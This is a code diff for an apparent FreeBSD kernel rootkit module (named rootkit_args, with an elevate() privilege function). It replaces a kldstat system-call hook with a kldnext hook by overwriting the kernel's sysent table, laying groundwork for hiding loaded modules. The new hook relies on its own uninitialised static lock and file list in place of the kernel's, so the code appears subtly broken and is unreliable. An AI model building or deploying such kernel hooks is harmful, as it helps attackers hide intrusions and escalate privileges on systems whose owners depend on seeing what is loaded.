@@ -6,16 +6,69 @@
 #include <sys/kernel.h>
 #include <sys/systm.h>
 #include <sys/sysproto.h>
-
+#include <sys/syscall.h>
 #include <sys/param.h>
+#include <sys/linker.h>
+
 #include <sys/proc.h>
 #include <sys/resourcevar.h>
 #include <sys/mutex.h>
 #include <sys/lock.h>
+#include <sys/sx.h>
 
-#include "hook.c"
+static struct sx kld_sx;
+static linker_file_list_t linker_files;
 
+static linker_file_t linker_find_file_by_id(int _fileid);
+static linker_file_t linker_find_file_by_id(int fileid)
+{
+	linker_file_t lf;
+
+	sx_assert(&kld_sx, SA_XLOCKED);
+	TAILQ_FOREACH(lf, &linker_files, link)
+		if (lf->id == fileid && lf->flags & LINKER_FILE_LINKED)
+			break;
+	return (lf);
+}
+
+int sys_kldnext_hook(struct thread *td, struct kldnext_args *uap);
 void elevate(struct thread *td);
+
+int sys_kldnext_hook(struct thread *td, struct kldnext_args *uap)
+{
+	linker_file_t lf;
+	int error = 0;
+
+#ifdef MAC
+	error = mac_kld_check_stat(td->td_ucred);
+	if (error)
+		return (error);
+#endif
+
+	sx_xlock(&kld_sx);
+	if (uap->fileid == 0)
+		lf = TAILQ_FIRST(&linker_files);
+	else {
+		lf = linker_find_file_by_id(uap->fileid);
+		if (lf == NULL) {
+			error = ENOENT;
+			goto out;
+		}
+		lf = TAILQ_NEXT(lf, link);
+	}
+
+	/* Skip partially loaded files. */
+	while (lf != NULL && !(lf->flags & LINKER_FILE_LINKED))
+		lf = TAILQ_NEXT(lf, link);
+
+	if (lf)
+		td->td_retval[0] = lf->id;
+	else
+		td->td_retval[0] = 0;
+out:
+	sx_xunlock(&kld_sx);
+	return (error);
+}
 
 /* The system call's arguments. */
 struct rootkit_args {
@@ -88,14 +141,14 @@ static int load(struct module *module, int cmd, void *arg) {
 	switch (cmd) {
 	case MOD_LOAD:
 		uprintf("System call loaded at offset %d.\n", offset);
-		sysent[SYS_kldstat].sy_call = (sy_call_t *)sys_kldstat_mod; // hook sys_kldstat
-		uprintf("kldstat hooked bb - pointed to %p ytb\n", (void *)sysent[SYS_kldstat].sy_call);
+		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext_hook;
+		// uprintf("kldnext hooked - pointed to %p ytb\n", (void *)sysent[SYS_kldnext].sy_call);
 		break;
 
 	case MOD_UNLOAD:
 		uprintf("System call unloaded from offset %d.\n", offset);
-		sysent[SYS_kldstat].sy_call = (sy_call_t *)sys_kldstat_mod;
-		uprintf("kldstat unhooked - returned to original syscall at %p\n", (void *)sysent[SYS_kldstat].sy_call);
+		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext;
+		// uprintf("next unhooked - returned to original syscall at %p\n", (void *)sysent[SYS_kldnext].sy_call);
 		break;
 
 	default:
